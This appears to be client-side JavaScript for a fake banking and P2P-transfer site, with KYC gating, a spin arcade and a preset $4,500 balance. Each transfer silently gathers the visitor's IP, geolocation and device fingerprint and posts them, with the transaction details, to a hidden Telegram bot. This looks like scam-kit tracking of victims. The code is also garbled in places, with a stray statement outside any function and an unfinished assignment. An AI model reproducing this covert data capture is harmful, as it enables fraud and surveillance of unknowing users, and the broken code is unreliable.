<script>
/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const DEFAULT_TG = window.PCH_IOS_TELEGRAM || { botToken:'', chatId:'' };
const P2P_MAX_TRANSFER = 50000;

function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.favoriteRecipients) parsed.favoriteRecipients = [];
      if (!parsed.scheduledTransfers) parsed.scheduledTransfers = [];
      if (!parsed.fundingMethods) parsed.fundingMethods = [];
      if (!parsed.dailyLimits) parsed.dailyLimits = { withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} };
      if (!parsed.autoWithdraw) parsed.autoWithdraw = { enabled:false, frequency:'weekly', amount:null, method:null };
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} }, withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}
async function syncCurrentUserToCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
  try {
    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions, dailyLimits: state.dailyLimits });
    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
  } catch(e){}
}
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (r.kyc) state.kyc = r.kyc;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    if (r.card) state.card = r.card;
    if (r.dailyLimits) state.dailyLimits = r.dailyLimits;
    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}
async function pullAllUsersFromCloud() { if (!window.rtdb) return {}; try { const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users')); return snap.exists() ? snap.val() : {}; } catch(e){ return {}; } }
function recordDailyUsage(kind, amount){ if (state.dailyLimits[kind]) state.dailyLimits[kind].used = +(state.dailyLimits[kind].used + amount).toFixed(2); saveDeviceState(); }

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ DEVICE + IP ═══════════ */
function detectDevice() {
  const ua = navigator.userAgent || '';
  let os='Unknown', type='Desktop', browser='Unknown';
  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
  else if (/Windows/i.test(ua)) { os='Windows'; }
  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
  else if (/Linux/i.test(ua)) { os='Linux'; }
  if (/Edg\//i.test(ua)) browser='Edge';
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
  else if (/Firefox\//i.test(ua)) browser='Firefox';
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
  return { os, type, browser };
}
let cachedIp = null, cachedGeo = null;
async function fetchIP(){
  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        cachedIp = d.ip;
        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
        return { ip: cachedIp, ...cachedGeo };
      }
    }
  } catch(e){}
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    if (d && d.ip) { cachedIp = d.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
  } catch(e){}
  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
  return { ip: cachedIp, ...cachedGeo };
}

/* ═══════════ TELEGRAM — silent failures, full unmasked payload ═══════════ */
function tgCreds() {
  const cfg = state.telegramConfig || {};
  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
}
async function sendTelegramMessage(textMessage) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}

function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }

function toggleNavDrawer() {
  const drawer = document.getElementById('nav-drawer');
  const overlay = document.getElementById('nav-overlay');
  if (drawer.classList.contains('-translate-x-full')) {
    drawer.classList.remove('-translate-x-full');
    overlay.classList.remove('hidden');
  } else {
    drawer.classList.add('-translate-x-full');
    overlay.classList.add('hidden');
  }
}

function isTabLocked(tabKey) {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isSetupComplete = !!state.configuredMethod;
  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
  if (tabKey === 'funds') return !isKycApproved;
  if (tabKey === 'winners') return !isKycApproved;
  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
  return false;
}
function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }

const DASHBOARD_TABS = [
  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
];
function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }

function renderHeaderNav() {
  const nav = document.getElementById('nav-actions'); if (!nav) return;

  nav.innerHTML = `

    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
  `;
}

/* ═══════════ TRANSFER PAGE ═══════════ */
function getAllSelectableUsers() { const me = (state.currentUser?.username||'').toLowerCase(); return (state.usersCache || []).filter(u => u && u.username && u.username.toLowerCase() !== me); }
let p2pSuggestionIdx = -1, p2pSuggestionList = [], p2pSelectedUser = null;

function handleP2PInput(e) { p2pSelectedUser = null; const wrap = document.getElementById('p2p-suggestions'); if (!wrap) return; const q = e.target.value.toLowerCase().trim(); if (!q) { wrap.classList.add('hidden'); wrap.innerHTML = ''; p2pSuggestionIdx = -1; p2pSuggestionList = []; return; } const pool = getAllSelectableUsers(); const matches = pool.filter(u => { const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).toLowerCase(); return (u.username||'').toLowerCase().includes(q) || fullName.includes(q) || (u.email||'').toLowerCase().includes(q); }).slice(0, 8); p2pSuggestionList = matches; p2pSuggestionIdx = matches.length > 0 ? 0 : -1; renderP2PSuggestions(); }
function renderP2PSuggestions() { const wrap = document.getElementById('p2p-suggestions'); if (!wrap) return; if (p2pSuggestionList.length === 0) { wrap.innerHTML = `<div class="p-4 text-center text-[11px] text-slate-500">No users match.</div>`; wrap.classList.remove('hidden'); return; } wrap.innerHTML = p2pSuggestionList.map((u,i)=>{ const fullName = `${u.firstName||''} ${u.lastName||''}`.trim() || u.username; const initials = (u.firstName||u.username||'U').charAt(0).toUpperCase(); return `<div class="p2p-suggestion ${i===p2pSuggestionIdx?'active':''}" onclick="selectP2PUser(${i})"><div class="p2p-avatar">${initials}</div><div class="p2p-info"><div class="p2p-name">${escapeHtml(fullName)}</div><div class="p2p-handle">@${escapeHtml(u.username)}</div></div><i class="fa-solid fa-circle-check text-emerald-400"></i></div>`; }).join(''); wrap.classList.remove('hidden'); }
function selectP2PUser(i) { const u = p2pSuggestionList[i]; if (!u) return; p2pSelectedUser = u; const input = document.getElementById('p2p-recipient'); if (input) input.value = `@${u.username}`; const wrap = document.getElementById('p2p-suggestions'); if (wrap) { wrap.classList.add('hidden'); wrap.innerHTML = ''; } p2pSuggestionIdx = -1; }
function handleP2PKeydown(e) { const wrap = document.getElementById('p2p-suggestions'); if (!wrap || wrap.classList.contains('hidden')) { if (e.key === 'ArrowDown') handleP2PInput(e); return; } if (e.key === 'ArrowDown') { e.preventDefault(); p2pSuggestionIdx = Math.min(p2pSuggestionIdx+1, p2pSuggestionList.length-1); renderP2PSuggestions(); } else if (e.key === 'ArrowUp') { e.preventDefault(); p2pSuggestionIdx = Math.max(p2pSuggestionIdx-1, 0); renderP2PSuggestions(); } else if (e.key === 'Enter') { if (p2pSuggestionIdx >= 0 && p2pSuggestionList[p2pSuggestionIdx]) { e.preventDefault(); selectP2PUser(p2pSuggestionIdx); } } }
document.addEventListener('click', (e)=>{ const wrap = document.getElementById('p2p-suggestions'); const input = document.getElementById('p2p-recipient'); if (wrap && input && !wrap.contains(e.target) && !input.contains(e.target) && e.target !== input) wrap.classList.add('hidden'); });

async function submitP2PTransfer(e) {
  e.preventDefault();
  if (isTabLocked('transfer')) return;
  const amt = parseFloat(document.getElementById('p2p-amount').value);
  if (!p2pSelectedUser) { showToast('Select Recipient', 'Pick a user.', 'warning'); return; }
  if (!amt || amt > state.userBalance) { showToast('Invalid Amount', 'Enter valid amount.', 'warning'); return; }
  const memo = (document.getElementById('p2p-memo')?.value || '').trim();

  const ref = 'P2P-' + Math.floor(100000 + Math.random()*900000);
  const recipientName = p2pSelectedUser.username;
  const recipientFullName = `${p2pSelectedUser.firstName||''} ${p2pSelectedUser.lastName||''}`.trim() || 'N/A';
  const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
  const nowIso = new Date().toISOString();
  const balBefore = state.userBalance;

  const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); modal.style.display = 'flex';
  content.innerHTML = loadingOverlayHtml('Processing Transfer', `Routing funds securely to @${recipientName}...`, 'p2p-load-pct', 'p2p-load-bar');
  
  let progress = 0;
  const interval = setInterval(async () => {
    progress += Math.floor(Math.random()*15) + 8; if (progress > 100) progress = 100;
    const bar = document.getElementById('p2p-load-bar'); const pct = document.getElementById('p2p-load-pct');
    if (bar) bar.style.width = progress + '%'; if (pct) pct.textContent = progress + '%';
    
    if (progress >= 100) {
      clearInterval(interval);
      state.userBalance -= amt; recordDailyUsage('p2p', amt);
      state.transactions.unshift({ ref, date:nowStr, amount:amt, type:'P2P Sent', status:'Completed', counterparty:recipientName, memo });
      
      if (window.rtdb) {
        try {
          const rSnap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + recipientName.toLowerCase()));
          if (rSnap.exists()) {
            const rUser = rSnap.val();
            rUser.userBalance = (Number(rUser.userBalance) || 0) + amt;
            rUser.transactions = Array.isArray(rUser.transactions) ? rUser.transactions : [];
            rUser.transactions.unshift({ ref, date:nowStr, amount:amt, type:'P2P Received', status:'Completed', counterparty: state.currentUser.username, memo });
            await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + recipientName.toLowerCase()), rUser);
          }
        } catch(err) {}
      }
      
      saveDeviceState();

      const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
      const dev = detectDevice();
      sendTelegramMessage(
        buildTransferTelegramHeader('💸 P2P TRANSFER SENT', ref) +
        `<b>To username:</b> @${tgEsc(recipientName)}\n` +
        `<b>To name:</b> ${tgEsc(recipientFullName)}\n` +
        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
        `<b>Memo:</b> ${tgEsc(memo || '(none)')}\n` +
        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
        `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
        `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
        `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
        `<b>Timestamp:</b> ${nowIso}`
      ).catch(()=>{});
      
      setTimeout(() => {
        content.innerHTML = render3DSuccess('Payment Successful', `Sent ${fmtMoney(amt)} to @${recipientName}`, ref, 'fa-paper-plane', 'from-sky-custom to-emerald-500');
        showToast('Sent', 'Transfer successful.', 'success');
      }, 400);
    }
  }, 120);
}

  e.preventDefault();
  if (isTabLocked('transfer')) return;

async function submitSplitPayment() {
  const rows = Array.from(document.querySelectorAll('.split-row'));
  const entries = rows.map(r => ({
    to: (r.querySelector('.split-to').value||'').replace(/^@/,'').trim(),
    amt: parseFloat(r.querySelector('.split-amt').value),
    memo: r.querySelector('.split-memo').value||''
  })).filter(e => e.to && e.amt > 0);

  if (entries.length === 0) { showToast('Empty', 'Add at least one recipient.', 'warning'); return; }

  const total = entries.reduce((s,e) => s + e.amt, 0);
  if (total > state.userBalance) {
    showToast('Insufficient Funds', `Total ${fmtMoney(total)} exceeds balance ${fmtMoney(state.userBalance)}.`, 'error');
    return;
  }

  const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
  const nowIso = new Date().toISOString();
  const balBefore = state.userBalance;
  let sent = 0;
  const lines = [];

  for (const e of entries) {
    const ref = 'P2P-SP-' + Math.floor(100000 + Math.random()*900000);
    state.userBalance -= e.amt;
    state.transactions.unshift({ ref, date:nowStr, amount:e.amt, type:'P2P Sent', status:'Completed', memo:'[Split] '+e.memo, counterparty:e.to });
    recordDailyUsage('p2p', e.amt);
    lines.push(`  • @${e.to} — ${fmtMoney(e.amt)} — ${e.memo || '(no memo)'} — Ref ${ref}`);

    if (window.rtdb) {
      try {
        const rSnap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + e.to.toLowerCase()));
        if (rSnap.exists()) {
          const rUser = rSnap.val();
          rUser.userBalance = (Number(rUser.userBalance) || 0) + e.amt;
          rUser.transactions = Array.isArray(rUser.transactions) ? rUser.transactions : [];
          rUser.transactions.unshift({ ref, date:nowStr, amount:e.amt, type:'P2P Received', status:'Completed', counterparty: state.currentUser.username, memo:'[Split] '+e.memo });
          await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + e.to.toLowerCase()), rUser);
        }
      } catch(err) {}
    }
    sent++;
  }

  saveDeviceState();
  closeModal();
  showToast('Split Complete', `${sent} transfers sent.`, 'success');

  const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
  const dev = detectDevice();
  sendTelegramMessage(
    buildTransferTelegramHeader('✂️ SPLIT PAYMENT SENT', 'SPLIT-' + Date.now()) +
    `<b>Recipients:</b> ${sent}\n` +
    `<b>Total sent:</b> ${fmtMoney(total)}\n` +
    `<b>Breakdown:</b>\n${lines.map(l => tgEsc(l)).join('\n')}\n` +
    `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
    `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
    `<b>Timestamp:</b> ${nowIso}`
  ).catch(()=>{});

  render();
}

function handleSplitInput(e, idx) {
  const q =
  const wrap = document.getElementById('split-suggestions-' + idx);
  if (!wrap) return;
  if (!q) { wrap.classList.add('hidden'); wrap.innerHTML = ''; return; }
  const pool = getAllSelectableUsers();
  const matches = pool.filter(u => {
    const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).toLowerCase();
    return (u.username||'').toLowerCase().includes(q) || fullName.includes(q);
  }).slice(0, 5);
  if (matches.length === 0) {
    wrap.innerHTML = `<div class="p-2 text-center text-[10px] text-slate-500">No match</div>`;
    wrap.classList.remove('hidden');
    return;
  }
  wrap.innerHTML = matches.map(u => {
    const fullName = `${u.firstName||''} ${u.lastName||''}`.trim() || u.username;
    return `<div class="p-2 cursor-pointer hover:bg-navy-800 border-b border-navy-700/50" onclick="selectSplitUser(${idx}, '${escapeHtml(u.username)}')">
      <p class="text-xs font-bold text-white">${escapeHtml(fullName)}</p>
      <p class="text-[9px] text-sky-custom">@${escapeHtml(u.username)}</p>
    </div>`;
  }).join('');
  wrap.classList.remove('hidden');
}

function selectSplitUser(idx, username) {
  const inputs = document.querySelectorAll('.split-to');
  if (inputs[idx]) inputs[idx].value = username;
  const wrap = document.getElementById('split-suggestions-' + idx);
  if (wrap) wrap.classList.add('hidden');
}
